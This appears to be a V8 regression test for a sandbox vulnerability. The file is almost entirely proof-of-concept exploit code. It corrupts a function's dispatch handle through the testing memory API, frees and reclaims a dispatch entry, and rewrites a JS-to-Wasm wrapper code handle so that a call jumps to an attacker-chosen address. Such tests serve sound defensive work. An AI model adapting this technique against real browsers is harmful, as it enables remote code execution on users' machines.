// Copyright 2025 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --allow-natives-syntax --sandbox-testing --expose-gc

const kHeapObjectTag = 0x1;
const kCodeWrapperMap = 0x1239;
const kDispatchHandleOffset = Sandbox.getFieldOffset(
  Sandbox.getInstanceTypeIdFor("JS_FUNCTION_TYPE"),
  "dispatch_handle"
);
const kFeedbackCellOffset = 0x18;

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const getPtr = (obj) => Sandbox.getAddressOf(obj) + kHeapObjectTag;
const getField = (obj, offset) => memory.getUint32(getPtr(obj) + offset - kHeapObjectTag, true);
const setField = (obj, offset, value) => memory.setUint32(getPtr(obj) + offset - kHeapObjectTag, value, true);

// from test/mjsunit/sandbox/regress-430960844.js
let spray_mod = new WebAssembly.Module(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 24, 2, 96, 16, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 0, 96, 1, 126, 0, 2, 15, 1, 2, 106, 115, 8, 115, 112, 114, 97, 121, 95, 99, 98, 0, 0, 3, 2, 1, 1, 7, 9, 1, 5, 115, 112, 114, 97, 121, 0, 1, 10, 38, 1, 36, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 16, 0, 11]));
let { spray } = new WebAssembly.Instance(spray_mod, { js: { spray_cb: () => { } } }).exports;

// get a clean slate
const type_major_literal = {type: "major"}; // inlining this disturbs GC -_o_-
gc(type_major_literal);

// eval to push the dispatch handle down
const AsmModule = eval(`(function () {
  "use asm";
  function f() {}
  return f;
})`);
const dispatch_handle = getField(AsmModule, kDispatchHandleOffset);

// it's more effort to let it get freed for real while fake_start trains, hence this toggle
let free_for_real = false;
const free_asm_module_dispatch_entry = () => {
  if (!free_for_real) return;
  // changing dispatch handle to something else that exists so CompileLazy gets installed
  // on said something else when fake_start throws as opposed to AsmModule itself
  setField(AsmModule, kDispatchHandleOffset, getField(fake_start, kDispatchHandleOffset));
  // technically only dispatch handle inside it needs to be changed but -_o_-
  setField(AsmModule, kFeedbackCellOffset, 0);
  gc(type_major_literal);
}

const fake_start = () => {
  free_asm_module_dispatch_entry();
  // reclaim it with higher arg count now and throw to get it to tail to reclaimed entry
  throw eval(`
    let imbalancer = (a0,a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14,a15,a16,a17,a18,a19) => {};
    %PrepareFunctionForOptimization(imbalancer);
    imbalancer();
    %OptimizeFunctionOnNextCall(imbalancer);
    imbalancer();
    imbalancer
  `);
};
%PrepareFunctionForOptimization(fake_start);
try { fake_start(); } catch {}
setField(AsmModule, kDispatchHandleOffset, dispatch_handle);
%OptimizeMaglevOnNextCall(fake_start);
try { fake_start(); } catch {}
setField(AsmModule, kDispatchHandleOffset, dispatch_handle);
const fake_start_code_handle = 0x380201;

// do a legit run to get a start wrapper on the js to wasm wrappers cache
AsmModule();
// find and replace start wrapper code handle to point to fake_start's
// job g_current_isolate_->isolate_data_->roots_table_->roots_[RootIndex::kJSToWasmWrappers]
const start_wrapper_code_handle = 0x380601; // also happens to be the export's in this version
for (let i = 0x1000000; i < 0x10c0000; i += 4) {
  if (
    memory.getUint32(i, true) == kCodeWrapperMap &&
    memory.getUint32(i + 4, true) == start_wrapper_code_handle
  ) {
    memory.setUint32(i + 4, fake_start_code_handle, true);
  }
}

// take func as an arg to prevent it being called via dispatch handle
// as otherwise the handle gets stored in trusted reloc info and triggers
// deopt when AsmModule's dispatch entry gets freed iirc
function call(func, addr) {
  func();
  spray(addr);
}
%PrepareFunctionForOptimization(call);
call(() => {}, 0n);
call(() => {}, 1n);
%OptimizeFunctionOnNextCall(call);
call(() => {}, 2n);

free_for_real = true;
call(AsmModule, 0x424242424242n);
